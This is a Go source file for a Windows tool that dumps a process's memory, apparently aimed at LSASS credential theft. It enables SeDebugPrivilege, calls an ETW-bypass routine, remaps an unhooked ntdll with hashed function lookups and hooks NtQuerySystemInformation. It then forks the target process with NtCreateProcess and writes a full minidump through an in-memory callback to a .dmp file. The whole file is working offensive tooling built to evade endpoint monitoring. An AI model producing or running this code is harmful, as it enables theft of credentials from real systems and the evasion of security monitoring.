package main

import (
	"bytes"
	"crypto/sha1"
	"encoding/binary"
	"fmt"
	"github.com/castaneai/hinako"
	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"syscall"
	"time"
	"unsafe"
)

const (
	ModuleCallback = iota
	ThreadCallback
	ThreadExCallback
	IncludeThreadCallback
	IncludeModuleCallback
	MemoryCallback
	CancelCallback
	WriteKernelMinidumpCallback
	KernelMinidumpStatusCallback
	RemoveMemoryCallback
	IncludeVmRegionCallback
	IoStartCallback
	IoWriteAllCallback
	IoFinishCallback
	ReadMemoryFailureCallback
	SecondaryFlagsCallback
	IsProcessSnapshotCallback
	VmStartCallback
	VmQueryCallback
	VmPreReadCallback
	VmPostReadCallback

	S_FALSE                = 1
	S_OK                   = 0
	TRUE                   = 1
	FALSE                  = 0
	IncrementSize          = 5 * 1024 * 1024
	MiniDumpWithFullMemory = 0x00000002
)

var bytesRead uint32 = 0

type WindowsDump struct {
	data []byte
}

type outDump struct {
	outPtr uintptr
}

func SePrivEnable(s string) error {
	var tokenHandle windows.Token
	thsHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return err
	}
	windows.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		windows.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(s), &luid)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("LookupPrivilegeValueW failed", err)
		// {{end}}
		return err
	}
	privs := windows.Tokenprivileges{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	err = windows.AdjustTokenPrivileges(tokenHandle, false, &privs, 0, nil, nil)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("AdjustTokenPrivileges failed", err)
		// {{end}}
		return err
	}
	return nil
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func main() {
	ByETW()
	pid, _ := strconv.Atoi(os.Args[1])

	if err := SePrivEnable("SeDebugPrivilege"); err != nil {
		return
	}
	ReMapNtdll, _ := gabh.ReMapNtdll()
	var arch *hinako.ArchAMD64

	//===============================================
	//
	//		Hook API
	//
	//===============================================

	NtQuerySystemInformation, _, e := ReMapNtdll.GetFuncUnhook("ff06d2a62a1b4f33ab91d501ad53158cf899f780", str2sha1)
	if e != nil {
		panic(e)
	}

	// API Hooking by hinako
	//var original *syscall.Proc
	var hook2 *hinako.Hook
	hook2, _ = hinako.NewHookByName(arch, "ntdll.dll", "NtQuerySystemInformation", func(n1, n2, n3, n4 uintptr) uintptr {
		fmt.Println("---------------------------------------------------")
		fmt.Println("NtQuerySystemInformation hooked !!!!!")

		windows.SleepEx(1, false)

		r, _, _ := syscall.Syscall6(uintptr(NtQuerySystemInformation), 4, n1, n2, n3, n4, 0, 0)
		//r, _, _ := syscall.Syscall6(original.Addr(), 5, n1,n2,n3,n4,n5,0)

		fmt.Println("---------------------------------------------------")
		fmt.Println("")

		return uintptr(r)
	})

	defer hook2.Close()
	//original = hook1.OriginalProc
	// After hook

	//===============================================
	//
	//		Hook End
	//
	//===============================================

	//Read and Fork

	/*
		hProc, err := windows.OpenProcess(0x0040, false, uint32(pid))
		currentProcHandle, err := windows.GetCurrentProcess()
		if err != nil {
			return
		}
		var lpTargetHandle windows.Handle
		err = windows.DuplicateHandle(hProc, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, 0x00000002)
		if err != nil {
			return
		}

	*/

	var hProcess uintptr
	ZwOpenProcess := syscall.NewLazyDLL("ntdll.dll").NewProc("ZwOpenProcess")

	ZwClose := syscall.NewLazyDLL("ntdll.dll").NewProc("ZwClose")

	hProcess, _, _, _ = ZwOpenP(uintptr(ZwOpenProcess.Addr()), uintptr(pid))

	/*
		NtDuplicateObject := syscall.NewLazyDLL("ntdll.dll").NewProc("NtDuplicateObject")
		var hDuped uintptr
		status, _, _ := NtDuplicateObject.Call(hProcess, 0xffffffffffffffff, 0xffffffffffffffff, uintptr(unsafe.Pointer(&hDuped)), 0, 0, syscall.DUPLICATE_SAME_ACCESS)

		ZwClose.Call(hProcess)

		if status != 0 {
			fmt.Println("NtDuplicateObject error")
			return
		}
		hProcess = hDuped

	*/

	NtCreateProcess := syscall.NewLazyDLL("ntdll.dll").NewProc("NtCreateProcess")

	var CloneObjectAttributes windows.OBJECT_ATTRIBUTES
	var currentSnapshotProcess uintptr

	CloneObjectAttributes.Length = uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{}))
	CloneObjectAttributes.RootDirectory = 0
	CloneObjectAttributes.Attributes = 0x00000040
	CloneObjectAttributes.ObjectName = nil
	CloneObjectAttributes.SecurityDescriptor = nil
	CloneObjectAttributes.SecurityQoS = nil

	//syscall.Syscall9(uintptr(NtCreateProcessEx),9,uintptr(unsafe.Pointer(&currentSnapshotProcess)),0x1fffff,0,hProcess,0,0,0,0,0)
	syscall.Syscall9(uintptr(NtCreateProcess.Addr()), 8, uintptr(unsafe.Pointer(&currentSnapshotProcess)), syscall.GENERIC_ALL, uintptr(unsafe.Pointer(&CloneObjectAttributes)), hProcess, 1, 0, 0, 0, 0)

	ZwClose.Call(hProcess)

	fpid, err := windows.GetProcessId(windows.Handle(currentSnapshotProcess))
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	//Read and Fork End
	dump, _ := minidump(uint32(fpid), windows.Handle(currentSnapshotProcess))

	filen := strconv.Itoa(int(time.Now().UnixMilli())) + ".dmp"
	if dump != nil {
		ioutil.WriteFile(filen, dump, 0644)
	}
	fmt.Println("dump Success" + filen)

}

func ZwOpenP(ZwOpenProcess uintptr, pid uintptr) (uintptr, uintptr, uintptr, error) {
	type objectAttrs struct {
		Length                   uintptr
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uintptr
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}

	type clientID struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}

	var pHndl uintptr
	r1, r2, lastErr := syscall.Syscall6(ZwOpenProcess, 4,
		uintptr(unsafe.Pointer(&pHndl)),
		windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_CREATE_PROCESS,
		uintptr(unsafe.Pointer(&objectAttrs{0, 0, 0, 0, 0, 0})),
		uintptr(unsafe.Pointer(&clientID{uintptr(pid), 0})),
		0,
		0,
	)
	return pHndl, r1, r2, lastErr
}

type ProcessMemoryCounters struct {
	Cb                         uint32
	PageFaultCount             uint32
	PeakWorkingSetSize         int
	WorkingSetSize             int
	QuotaPeakPagedPoolUsage    int
	QuotaPagedPoolUsage        int
	QuotaPeakNonPagedPoolUsage int
	QuotaNonPagedPoolUsage     int
	PagefileUsage              int
	PeakPagefileUsage          int
}

var _ unsafe.Pointer

var (
	modDbgHelp  = windows.NewLazySystemDLL("DbgHelp.dll")
	modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
	modntdll    = windows.NewLazySystemDLL("ntdll.dll")
	modpsapi    = windows.NewLazySystemDLL("psapi.dll")

	procMiniDumpWriteDump    = modDbgHelp.NewProc("MiniDumpWriteDump")
	procGetProcessHeap       = modkernel32.NewProc("GetProcessHeap")
	procHeapAlloc            = modkernel32.NewProc("HeapAlloc")
	procHeapFree             = modkernel32.NewProc("HeapFree")
	procHeapReAlloc          = modkernel32.NewProc("HeapReAlloc")
	procHeapSize             = modkernel32.NewProc("HeapSize")
	procRtlCopyMemory        = modntdll.NewProc("RtlCopyMemory")
	procGetProcessMemoryInfo = modpsapi.NewProc("GetProcessMemoryInfo")
)

func GetProcessHeap() (procHeap windows.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetProcessHeap.Addr(), 0, 0, 0, 0)
	procHeap = windows.Handle(r0)
	if procHeap == 0 {
		err = errnoErr(e1)
	}
	return
}

func GetProcessMemoryInfo(process windows.Handle, ppsmemCounters *ProcessMemoryCounters, cb uint32) (err error) {
	r1, _, e1 := syscall.Syscall(procGetProcessMemoryInfo.Addr(), 3, uintptr(process), uintptr(unsafe.Pointer(ppsmemCounters)), uintptr(cb))
	if r1 == 0 {
		err = errnoErr(e1)
	}
	return
}

func HeapAlloc(hHeap windows.Handle, dwFlags uint32, dwBytes uintptr) (lpMem uintptr, err error) {
	r0, _, e1 := syscall.Syscall(procHeapAlloc.Addr(), 3, uintptr(hHeap), uintptr(dwFlags), uintptr(dwBytes))
	lpMem = uintptr(r0)
	if lpMem == 0 {
		err = errnoErr(e1)
	}
	return
}

func MiniDumpWriteDump(hProcess windows.Handle, pid uint32, hFile uintptr, dumpType uint32, exceptionParam uintptr, userStreamParam uintptr, callbackParam uintptr) (err error) {
	r1, _, e1 := syscall.Syscall9(procMiniDumpWriteDump.Addr(), 7, uintptr(hProcess), uintptr(pid), uintptr(hFile), uintptr(dumpType), uintptr(exceptionParam), uintptr(userStreamParam), uintptr(callbackParam), 0, 0)
	if r1 == 0 {
		err = errnoErr(e1)
	}
	return
}

func RtlCopyMemory(dest uintptr, src uintptr, dwSize uint32) {
	syscall.Syscall(procRtlCopyMemory.Addr(), 3, uintptr(dest), uintptr(src), uintptr(dwSize))
	return
}

func HeapFree(hHeap windows.Handle, dwFlags uint32, lpMem uintptr) (err error) {
	r1, _, e1 := syscall.Syscall(procHeapFree.Addr(), 3, uintptr(hHeap), uintptr(dwFlags), uintptr(lpMem))
	if r1 == 0 {
		err = errnoErr(e1)
	}
	return
}

func HeapReAlloc(hHeap windows.Handle, dwFlags uint32, lpMem uintptr, dwBytes uintptr) (lpRes uintptr, err error) {
	r0, _, e1 := syscall.Syscall6(procHeapReAlloc.Addr(), 4, uintptr(hHeap), uintptr(dwFlags), uintptr(lpMem), uintptr(dwBytes), 0, 0)
	lpRes = uintptr(r0)
	if lpRes == 0 {
		err = errnoErr(e1)
	}
	return
}

func HeapSize(hHeap windows.Handle, dwFlags uint32, lpMem uintptr) (res uint32, err error) {
	r0, _, e1 := syscall.Syscall(procHeapSize.Addr(), 3, uintptr(hHeap), uintptr(dwFlags), uintptr(lpMem))
	res = uint32(r0)
	if res == 0 {
		err = errnoErr(e1)
	}
	return
}

func minidump(pid uint32, proc windows.Handle) ([]byte, error) {
	dump := &WindowsDump{}

	heapHandle, err := GetProcessHeap()
	if err != nil {
		return dump.data, err
	}

	procMemCounters := ProcessMemoryCounters{}
	sizeOfMemCounters := uint32(unsafe.Sizeof(procMemCounters))
	err = GetProcessMemoryInfo(proc, &procMemCounters, sizeOfMemCounters)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("GetProcessMemoryInfo failed: %s\n", err)
		// {{end}}
		return dump.data, err
	}

	heapSize := procMemCounters.WorkingSetSize + IncrementSize

	dumpBuffer, err := HeapAlloc(heapHandle, 0x00000008, uintptr(heapSize))
	if err != nil {
		return dump.data, err
	}

	outData := outDump{
		outPtr: dumpBuffer,
	}

	callbackInfo := MiniDumpCallbackInformation{
		CallbackRoutine: windows.NewCallback(minidumpCallback),
		CallbackParam:   uintptr(unsafe.Pointer(&outData)),
	}

	err = MiniDumpWriteDump(
		proc,
		pid,
		0,
		MiniDumpWithFullMemory,
		0,
		0,
		uintptr(unsafe.Pointer(&callbackInfo)),
	)

	if err != nil {
		//{{if .Config.Debug}}
		log.Println("Minidump syscall failed:", err)
		//{{end}}
		return dump.data, err
	}
	outBuff := make([]byte, bytesRead)
	outBuffAddr := uintptr(unsafe.Pointer(&outBuff[0]))
	RtlCopyMemory(outBuffAddr, outData.outPtr, bytesRead)
	err = HeapFree(heapHandle, 0, outData.outPtr)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("HeapFree failed: \n", err)
		// {{end}}
		return dump.data, err
	}
	dump.data = outBuff
	fmt.Println("dump Success")
	return dump.data, nil

}

type MiniDumpIOCallback struct {
	Handle      uintptr
	Offset      uint64
	Buffer      uintptr
	BufferBytes uint32
}

type MiniDumpCallbackInput struct {
	ProcessId     uint32
	ProcessHandle uintptr
	CallbackType  uint32
	Io            MiniDumpIOCallback
}

type MiniDumpCallbackOutput struct {
	Status int32
}

type MiniDumpCallbackInformation struct {
	CallbackRoutine uintptr
	CallbackParam   uintptr
}

func getCallbackInput(callbackInputPtr uintptr) (*MiniDumpCallbackInput, error) {
	callbackInput := MiniDumpCallbackInput{}
	ioCallback := MiniDumpIOCallback{}
	bufferSize := unsafe.Sizeof(callbackInput)
	data := make([]byte, bufferSize)
	dataPtr := uintptr(unsafe.Pointer(&data[0]))
	RtlCopyMemory(dataPtr, callbackInputPtr, uint32(bufferSize))
	buffReader := bytes.NewReader(data)
	err := binary.Read(buffReader, binary.LittleEndian, &callbackInput.ProcessId)
	if err != nil {
		return nil, err
	}
	var procHandle uint64
	err = binary.Read(buffReader, binary.LittleEndian, &procHandle)
	if err != nil {
		return nil, err
	}
	callbackInput.ProcessHandle = uintptr(procHandle)
	err = binary.Read(buffReader, binary.LittleEndian, &callbackInput.CallbackType)
	if err != nil {
		return nil, err
	}
	var ioHandle uint64
	err = binary.Read(buffReader, binary.LittleEndian, &ioHandle)
	if err != nil {
		return nil, err
	}
	ioCallback.Handle = uintptr(ioHandle)
	err = binary.Read(buffReader, binary.LittleEndian, &ioCallback.Offset)
	if err != nil {
		return nil, err
	}
	var ioBuffer uint64
	err = binary.Read(buffReader, binary.LittleEndian, &ioBuffer)
	if err != nil {
		return nil, err
	}
	ioCallback.Buffer = uintptr(ioBuffer)
	err = binary.Read(buffReader, binary.LittleEndian, &ioCallback.BufferBytes)
	if err != nil {
		return nil, err
	}
	callbackInput.Io = ioCallback
	return &callbackInput, nil
}

func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackOutput *MiniDumpCallbackOutput) uintptr {
	callbackInput, err := getCallbackInput(callbackInputPtr)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("getCallbackInput failed: %s\n", err.Error())
		// {{end}}
		return FALSE
	}
	switch callbackInput.CallbackType {
	case IoStartCallback:
		callbackOutput.Status = S_FALSE
	case IoWriteAllCallback:
		callbackOutput.Status = S_OK
		outData := (*outDump)(unsafe.Pointer(callbackParam))
		procHeap, err := GetProcessHeap()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("minidumpCallback GetProcessHeap failed: %s\n", err.Error())
			// {{end}}
			return FALSE
		}
		currentBuffSize, err := HeapSize(procHeap, 0, outData.outPtr)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("minidumpCallback HeapSize failed: %s\n", err.Error())
			// {{end}}
			return FALSE
		}
		bytesAndOffset := callbackInput.Io.Offset + uint64(callbackInput.Io.BufferBytes)
		if bytesAndOffset >= uint64(currentBuffSize) {
			increasedSize := IncrementSize
			if bytesAndOffset <= uint64(currentBuffSize*2) {
				increasedSize = int(currentBuffSize) * 2
			} else {
				increasedSize += int(bytesAndOffset)
			}
			outData.outPtr, err = HeapReAlloc(procHeap, 0, outData.outPtr, uintptr(increasedSize))
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("minidumpCallback HeapReAlloc failed: %s\n", err.Error())
				// {{end}}
				return FALSE
			}
		}
		destination := outData.outPtr + uintptr(callbackInput.Io.Offset)
		RtlCopyMemory(destination, callbackInput.Io.Buffer, callbackInput.Io.BufferBytes)
		bytesRead += callbackInput.Io.BufferBytes
	case IoFinishCallback:
		callbackOutput.Status = S_OK
	default:
		return TRUE
	}
	return TRUE
}
